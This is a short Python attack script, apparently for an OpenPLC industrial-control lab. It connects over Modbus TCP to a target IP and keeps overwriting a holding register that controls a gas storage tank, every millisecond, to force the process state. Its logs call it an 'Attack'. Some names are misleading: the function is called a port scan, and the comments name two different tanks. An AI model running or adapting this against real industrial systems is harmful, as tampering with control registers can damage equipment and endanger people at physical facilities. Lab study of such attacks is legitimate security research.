#!/usr/bin/env python3
import time 
from pymodbus.client import ModbusTcpClient
import sys
import logging

# Configure logging to console (stdout)
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s',
                    level=logging.DEBUG,
                    handlers=[logging.StreamHandler()])

# Value of high pressure tank (HPT), which should be flooded
gst = 1


def scan_industrial_ports(ip):
    # Connect to ModbusTCP of the OpenPLC
    client = ModbusTcpClient(host=ip,port=502)   # Create client object
    client.connect()                 # connect to device, reconnect automatically

    # While true loop for flooding
    while True:
        logging.debug("Setting GST state to fixed value " + str(gst))

        client.write_registers(1124,gst) #(register, value, unit)  
    
        time.sleep(0.001)
        
    client.close() # Disconnect device
print
if __name__ == "__main__":
    if len(sys.argv) != 2:
        logging.error("Usage: python3 override.py <IP Address of the Target>")
        sys.exit(1)
    
    # Get the IP address from the command-line arguments
    ip_address = sys.argv[1]

    logging.debug("This script will flood the value of the gas storage tank (GST) of the OpenPLC")
    logging.debug("Flodding IP: " + str(ip_address))
    
    # Run the scan
    logging.info("Attack started")
    time.sleep(2)
    scan_industrial_ports(ip_address)
    logging.info("Attack finished")
